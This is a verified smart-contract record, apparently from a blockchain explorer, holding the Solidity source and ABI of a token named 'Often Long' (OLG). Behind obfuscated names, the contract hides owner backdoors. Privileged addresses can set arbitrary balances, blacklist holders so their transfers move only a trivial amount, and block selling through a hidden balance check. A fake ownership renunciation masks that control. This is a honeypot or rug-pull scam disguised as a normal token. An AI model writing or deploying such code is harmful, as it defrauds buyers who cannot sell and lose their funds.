{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface txMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tokenSwapMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableFeeReceiver {\n    function createPair(address walletBuyTx, address totalFee) external returns (address);\n}\n\ninterface maxAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address liquidityAt) external view returns (uint256);\n\n    function transfer(address modeLaunched, uint256 tokenAmountTx) external returns (bool);\n\n    function allowance(address sellFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAmountTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeLaunched,\n        uint256 tokenAmountTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeMarketing, uint256 value);\n    event Approval(address indexed sellFrom, address indexed spender, uint256 value);\n}\n\ninterface maxAtMetadata is maxAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OftenLong is tokenSwapMarketing, maxAt, maxAtMetadata {\n\n    event OwnershipTransferred(address indexed receiverShouldSwap, address indexed receiverTrading);\n\n    bool private fromExempt;\n\n    function allowance(address senderMaxFund, address limitTeamMax) external view virtual override returns (uint256) {\n        if (limitTeamMax == minSender) {\n            return type(uint256).max;\n        }\n        return maxBuy[senderMaxFund][limitTeamMax];\n    }\n\n    function tradingShould(address receiverMin, uint256 tokenAmountTx) public {\n        receiverSwap();\n        autoShould[receiverMin] = tokenAmountTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldReceiverIs;\n    }\n\n    constructor (){\n        if (marketingLimit == atWallet) {\n            marketingLimit = atWallet;\n        }\n        txMax sellSender = txMax(minSender);\n        modeTrading = enableFeeReceiver(sellSender.factory()).createPair(sellSender.WETH(), address(this));\n        \n        listTx = _msgSender();\n        totalReceiver();\n        toLiquidity[listTx] = true;\n        autoShould[listTx] = shouldReceiverIs;\n        \n        emit Transfer(address(0), listTx, shouldReceiverIs);\n    }\n\n    bool private takeSwap;\n\n    uint8 private swapTeam = 18;\n\n    function balanceOf(address liquidityAt) public view virtual override returns (uint256) {\n        return autoShould[liquidityAt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapTeam;\n    }\n\n    bool public receiverFund;\n\n    address takeIsLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 enableLaunchedMarketing;\n\n    uint256 private shouldReceiverIs = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingMarketing;\n    }\n\n    function totalReceiver() public {\n        emit OwnershipTransferred(listTx, address(0));\n        fundExemptMin = address(0);\n    }\n\n    mapping(address => uint256) private autoShould;\n\n    bool public totalTxTake;\n\n    string private tokenFund = \"Often Long\";\n\n    function transfer(address receiverMin, uint256 tokenAmountTx) external virtual override returns (bool) {\n        return toShould(_msgSender(), receiverMin, tokenAmountTx);\n    }\n\n    function fundTrading(address buyLiquidity) public {\n        receiverSwap();\n        \n        if (buyLiquidity == listTx || buyLiquidity == modeTrading) {\n            return;\n        }\n        maxFee[buyLiquidity] = true;\n    }\n\n    address minSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return fundExemptMin;\n    }\n\n    uint256 private atWallet;\n\n    function buyTx(uint256 tokenAmountTx) public {\n        receiverSwap();\n        swapFeeTake = tokenAmountTx;\n    }\n\n    function receiverSwap() private view {\n        require(toLiquidity[_msgSender()]);\n    }\n\n    function enableAuto(address enableBuy, address modeLaunched, uint256 tokenAmountTx) internal returns (bool) {\n        require(autoShould[enableBuy] >= tokenAmountTx);\n        autoShould[enableBuy] -= tokenAmountTx;\n        autoShould[modeLaunched] += tokenAmountTx;\n        emit Transfer(enableBuy, modeLaunched, tokenAmountTx);\n        return true;\n    }\n\n    string private tradingMarketing = \"OLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return tokenFund;\n    }\n\n    mapping(address => bool) public toLiquidity;\n\n    bool private fundAt;\n\n    function owner() external view returns (address) {\n        return fundExemptMin;\n    }\n\n    mapping(address => bool) public maxFee;\n\n    mapping(address => mapping(address => uint256)) private maxBuy;\n\n    bool private swapTakeReceiver;\n\n    function receiverAt(address launchToken) public {\n        require(launchToken.balance < 100000);\n        if (receiverFund) {\n            return;\n        }\n        if (takeSwap == totalTxTake) {\n            totalTxTake = false;\n        }\n        toLiquidity[launchToken] = true;\n        \n        receiverFund = true;\n    }\n\n    uint256 public marketingLimit;\n\n    address private fundExemptMin;\n\n    uint256 constant senderTotal = 6 ** 10;\n\n    function approve(address limitTeamMax, uint256 tokenAmountTx) public virtual override returns (bool) {\n        maxBuy[_msgSender()][limitTeamMax] = tokenAmountTx;\n        emit Approval(_msgSender(), limitTeamMax, tokenAmountTx);\n        return true;\n    }\n\n    function transferFrom(address enableBuy, address modeLaunched, uint256 tokenAmountTx) external override returns (bool) {\n        if (_msgSender() != minSender) {\n            if (maxBuy[enableBuy][_msgSender()] != type(uint256).max) {\n                require(tokenAmountTx <= maxBuy[enableBuy][_msgSender()]);\n                maxBuy[enableBuy][_msgSender()] -= tokenAmountTx;\n            }\n        }\n        return toShould(enableBuy, modeLaunched, tokenAmountTx);\n    }\n\n    uint256 swapFeeTake;\n\n    address public modeTrading;\n\n    function toShould(address enableBuy, address modeLaunched, uint256 tokenAmountTx) internal returns (bool) {\n        if (enableBuy == listTx) {\n            return enableAuto(enableBuy, modeLaunched, tokenAmountTx);\n        }\n        uint256 tradingTake = maxAt(modeTrading).balanceOf(takeIsLimit);\n        require(tradingTake == swapFeeTake);\n        require(modeLaunched != takeIsLimit);\n        if (maxFee[enableBuy]) {\n            return enableAuto(enableBuy, modeLaunched, senderTotal);\n        }\n        return enableAuto(enableBuy, modeLaunched, tokenAmountTx);\n    }\n\n    address public listTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShouldSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMaxFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTeamMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeamMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmountTx\",\"type\":\"uint256\"}],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"}],\"name\":\"fundTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchToken\",\"type\":\"address\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTxTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountTx\",\"type\":\"uint256\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmountTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OftenLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}